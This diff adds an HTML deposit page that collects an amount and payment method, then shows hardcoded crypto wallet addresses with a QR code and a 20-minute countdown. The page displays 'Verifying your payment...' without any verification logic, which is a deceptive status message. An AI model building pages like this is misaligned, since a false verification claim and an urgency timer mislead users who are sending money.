@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Deposit</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #121212;
+      color: #fff;
+      padding: 40px 20px;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background: #1e1e2e;
+      border-radius: 10px;
+      padding: 30px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      border-top: 5px solid;
+      border-image: linear-gradient(to right, red, orange, yellow) 1;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      background: linear-gradient(90deg, #00fff0, #00aaff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 15px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    input, select {
+      background: #2e2e3e;
+      color: #fff;
+    }
+
+    button {
+      background: linear-gradient(to right, #ffaa00, #ff6600);
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .payment-details {
+      text-align: center;
+      margin-top: 30px;
+    }
+
+    .countdown {
+      font-size: 18px;
+      color: #ffcc00;
+      margin-bottom: 10px;
+    }
+
+    .qr img {
+      margin: 15px 0;
+    }
+
+    .address {
+      background: #2e2e3e;
+      padding: 10px;
+      border-radius: 6px;
+      word-break: break-word;
+      margin-bottom: 10px;
+    }
+
+    .loading-text {
+      font-size: 16px;
+      margin-top: 10px;
+      color: #aaa;
+    }
+
+    .next-text {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #888;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+  <div id="formPage" class="container">
+    <h2>Add Balance</h2>
+
+    <!-- Amount Input -->
+    <label for="amount">Enter Deposit Amount ($):</label>
+    <input type="number" id="amount" placeholder="Enter any amount" />
+
+    <!-- Method Selection -->
+    <label for="method">Select Payment Method:</label>
+    <select id="method">
+      <option value="">-- Select Method --</option>
+      <option value="bsc">BSC BEP20</option>
+      <option value="trc">TRC20</option>
+      <option value="binance">Binance Pay</option>
+    </select>
+
+    <!-- Button to trigger details -->
+    <button onclick="showDetails()"> Next</button>
+  </div>
+
+  <!-- New Page/Section -->
+  <div id="detailsPage" class="container hidden">
+    <h2>Payment Details</h2>
+    <div class="countdown" id="timer">Time left: 20:00</div>
+    <div class="qr" id="qr"></div>
+    <div class="address" id="wallet"></div>
+    <div class="loading-text">⏳ Verifying your payment...</div>
+    <div class="next-text">Show Payment Details → Next</div>
+  </div>
+
+  <script>
+    let countdown;
+    const wallets = {
+      bsc: {
+        address: "0x1e6bd08aa12e01a0369b2e36a80b6d0237171c45",
+        qr: true
+      },
+      trc: {
+        address: "TJojFCfEbumnF9fP72PQtuMkDTL2XGiNkf",
+        qr: true
+      },
+      binance: {
+        address: "Binance Pay ID: 521069007",
+        qr: false
+      }
+    };
+
+    function showDetails() {
+      const method = document.getElementById("method").value;
+      const amount = document.getElementById("amount").value.trim();
+
+      if (!method || !amount || parseFloat(amount) <= 0) {
+        alert("Please enter a valid amount and select a payment method.");
+        return;
+      }
+
+      const info = wallets[method];
+      const qrContainer = document.getElementById("qr");
+      const walletEl = document.getElementById("wallet");
+
+      // Switch views
+      document.getElementById("formPage").classList.add("hidden");
+      document.getElementById("detailsPage").classList.remove("hidden");
+
+      // QR code
+      if (info.qr) {
+        const encodedAddress = encodeURIComponent(info.address);
+        qrContainer.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodedAddress}" alt="QR Code" />`;
+      } else {
+        qrContainer.innerHTML = '';
+      }
+
+      // Wallet display
+      walletEl.innerHTML = info.address;
+
+      // Start countdown
+      startTimer("timer", 20 * 60);
+    }
+
+    function startTimer(elementId, duration) {
+      clearInterval(countdown);
+      const timerDisplay = document.getElementById(elementId);
+      let time = duration;
+
+      countdown = setInterval(() => {
+        const minutes = String(Math.floor(time / 60)).padStart(2, '0');
+        const seconds = String(time % 60).padStart(2, '0');
+        timerDisplay.textContent = `Time left: ${minutes}:${seconds}`;
+
+        if (--time < 0) {
+          clearInterval(countdown);
+          timerDisplay.textContent = "Expired!";
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
